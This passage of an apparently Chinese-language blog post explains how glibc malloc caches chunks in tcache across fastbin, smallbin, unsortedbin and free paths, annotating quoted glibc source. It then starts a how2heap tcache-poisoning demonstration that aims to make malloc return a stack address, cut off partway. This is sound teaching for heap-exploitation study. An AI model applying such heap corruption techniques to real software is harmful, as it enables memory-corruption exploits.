class="comment">//tc_idx是否落在tcache范围内,也就是说堆块大小是不是在tcache管理范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache	<span class="comment">//是否已经初始化</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)		<span class="comment">//对应的桶子中是否有剩余堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);	<span class="comment">//哪一个堆块,返回值,由于tcache中指针自然指向mem区域,因此不需要再指针转换</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="int_malloc"></a>int_malloc</h3><p>fastbin和smallbin的缓存算法基本一致</p>
<p>unsortedbin的缓存算法比较复杂</p>
<p>largebin不需要缓存</p>
<h4 id="对fastbin的缓存"><a href="#对fastbin的缓存" class="headerlink" title="对fastbin的缓存"></a>对fastbin的缓存</h4><p>fastbin中的分配规则为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应nb的fastbin中有至少一个堆块,首先把这个堆块拿出来放到victim上</span><br><span class="line">然后把这个桶子中其他堆块拆下来,塞进tcache,直到tcache的对应桶子中塞满7个为止</span><br><span class="line">最后返回那个victim</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (SINGLE_THREAD_P)//单线程的情况</span><br><span class="line">        *fb = victim-&gt;fd;</span><br><span class="line">      else//多线程的情况</span><br><span class="line">        REMOVE_FB(fb, pp, victim);//首先拿出一个堆块来</span><br><span class="line">      if (__glibc_likely(victim != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        size_t victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        if (__builtin_expect(victim_idx != idx, 0))</span><br><span class="line">          malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">#if USE_TCACHE				//已经拿出了一个符合要求的堆块,剩余的堆块放到tcache中缓存(直到tcache满),如果tcache满了就不再往里塞了</span><br><span class="line">        /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">     stash them in the tcache.  */</span><br><span class="line">        size_t tc_idx = csize2tidx(nb);</span><br><span class="line">        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            if (SINGLE_THREAD_P)</span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely(tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">        void *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h4 id="对smallbin的缓存"><a href="#对smallbin的缓存" class="headerlink" title="对smallbin的缓存"></a>对smallbin的缓存</h4><p>smallbin的分配规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应smallbin中有至少一个堆块,把他拿下来放到victim上</span><br><span class="line">该smallbin桶子中剩余的堆块放到对应tcache上,直到放满7个</span><br><span class="line">最后返回victim</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)<span class="comment">//首先取出一个last(bin)堆块来给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//将victim从链上摘下来</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena(victim);</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE			<span class="comment">//本桶子中剩余的堆块塞进tcache,塞满7个为止,多余的仍在smallbin中放着</span></span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">        <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              set_non_main_arena(tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="对unsortedbin的缓存"><a href="#对unsortedbin的缓存" class="headerlink" title="对unsortedbin的缓存"></a>对unsortedbin的缓存</h4><p>对unsortedbin的缓存算法是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">拿出一个victim,如果是last_remainder,并且大小合适,则直接从其上进行分割然后 返回,不会进行缓存</span><br><span class="line">否则</span><br><span class="line">	如果victim大小正好满足要求,不急着返回,而是首先尝试将其放到tcache中缓存</span><br><span class="line">		如果tcache有空位置则放进去,然后tcache_nb置1表明至少tcache中有一个适配堆块</span><br><span class="line">		如果tcache没有位置则直接 返回</span><br><span class="line">	如果victim大小不满足要求,则根据其大小放到smallbin或者largebin</span><br><span class="line">如果tcache_nb标志为1,并且在unsortedbin中转了足够多圈了,从tcache_nb 返回</span><br><span class="line">否则重新循环</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//每次拿出一个堆块交给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;<span class="comment">//如果是last_remainder则直接分配,此时不会再进行tcache缓存,推测原因是last_remainder刚用过,还在内存中,命中概率大</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//不是last_remainder</span></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;<span class="comment">//把victim拆下来</span></span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果当前堆块的大小符合要求,不会立刻分配,首先应该放到tcache中</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">     We may return one of these chunks later.  */</span></span><br><span class="line">        <span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put(victim, tc_idx);</span><br><span class="line">          return_cached = <span class="number">1</span>;<span class="comment">//记录至少有一个堆块放到了tcache,待会儿就可以从tcache中拿堆块了</span></span><br><span class="line">          <span class="keyword">continue</span>;	<span class="comment">//continue直接跳到while一开始拿下一个堆块了</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//直到对应tcache存满了才会直接进行分配</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          check_malloced_chunk(av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">          alloc_perturb(p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">		<span class="comment">//到此说明victim既不是last_remainder,大小也不是正合适</span></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//如果victim是smallbin范围的</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);<span class="comment">//放进smallbin</span></span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则说明是largebin中的,放到largebin,不会进入smallbin</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">   filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;<span class="comment">//unsortedbin中最大可以容忍的缓存次数</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">      &#125;<span class="comment">//结算阶段,如果return_cached是正合适大小的堆块入tcache的标记,如果被置1说明至少能从tcache中找到一个合适的堆块</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//unsortedbin这里的循环最多10000次</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>跳出unsortedbin循环,再检查一次tcache中是否有合适堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>





<p>后面使用largebin和topchunk进行分配时不会有tcache的缓存使用了</p>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free"></a>int_free</h3><p>释放时的tcache操作很简单,只在int_free中有一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put(p, tc_idx);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如果这堆块的大小在tcache的管理范围内,那么在一切释放工作开始之前,首先尝试将这个堆块放到tcache中</p>
<p>如果缓存则直接返回</p>
<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span 